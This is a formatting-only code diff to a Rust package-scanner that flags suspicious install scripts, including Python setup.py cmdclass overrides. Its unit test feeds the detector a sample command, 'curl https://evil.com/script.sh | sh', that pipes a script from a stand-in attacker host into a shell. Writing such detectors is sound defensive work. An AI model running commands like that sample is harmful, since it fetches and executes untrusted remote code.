@@ -171,18 +171,16 @@ pub fn analyze_npm_scripts(
 }
 
 /// Analyze Python setup.py for suspicious patterns
-pub fn analyze_python_setup(
-    package_name: &str,
-    setup_content: &str,
-) -> Vec<ThreatIndicator> {
+pub fn analyze_python_setup(package_name: &str, setup_content: &str) -> Vec<ThreatIndicator> {
     let mut threats = analyze_install_script(package_name, "setup.py", setup_content);
 
     // Additional Python-specific checks
     let mut evidence = Vec::new();
 
     // Check for cmdclass overrides (common malware technique)
-    if setup_content.contains("cmdclass") &&
-       (setup_content.contains("install") || setup_content.contains("develop")) {
+    if setup_content.contains("cmdclass")
+        && (setup_content.contains("install") || setup_content.contains("develop"))
+    {
         evidence.push("Custom install command class detected".to_string());
     }
 
@@ -240,7 +238,10 @@ mod tests {
         let script = "curl https://evil.com/script.sh | sh";
         let threats = analyze_install_script("test-pkg", "postinstall", script);
         assert!(!threats.is_empty());
-        assert!(threats[0].evidence.iter().any(|e| e.contains("Remote script execution")));
+        assert!(threats[0]
+            .evidence
+            .iter()
+            .any(|e| e.contains("Remote script execution")));
     }
 
     #[test]
